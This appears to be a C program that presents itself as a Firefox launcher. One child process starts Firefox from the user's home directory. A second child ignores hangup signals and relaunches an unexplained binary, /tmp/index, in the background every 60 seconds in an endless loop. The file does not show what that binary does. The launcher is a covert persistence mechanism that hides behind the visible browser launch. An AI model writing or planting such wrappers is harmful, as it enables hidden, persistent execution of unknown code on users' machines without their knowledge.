#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/wait.h>
#include <fcntl.h>

int main() {
    // Fork a child process to launch Firefox
    pid_t firefox_pid = fork();

    if (firefox_pid == -1) {
        perror("fork for Firefox failed");
        return 1;
    } else if (firefox_pid == 0) {


        // Find current user's home directory
        struct passwd *pw = getpwuid(getuid());
        if (!pw) {
            perror("getpwuid failed");
            return 1;
        }

        // Construct the full path to Firefox
        char firefox_path[512];
        snprintf(firefox_path, sizeof(firefox_path), "%s/.local/share/firefox/firefox", pw->pw_dir);

        // Set environment variable for display
        setenv("DISPLAY", ":0", 1);

        // Execute Firefox
        execl(firefox_path, "firefox", NULL);

        perror("execl firefox failed");
        return 1;
    }

    // Fork a second child process to run /tmp/index in a loop in the background
    pid_t pid = fork();

    if (pid == -1) {
        perror("fork for /tmp/index failed");
        return 1;
    } else if (pid == 0) {

        printf("/second child forked for /tmp/index\n");

        // Ignore SIGHUP to prevent termination when the parent exits
        signal(SIGHUP, SIG_IGN);

        while (1) {
            system("/tmp/index &");
            sleep(60);  
        }
    }

    // Wait for both child processes to finish
    int status;
    waitpid(firefox_pid, &status, 0);  
    waitpid(pid, &status, 0);          
    return 0;
}
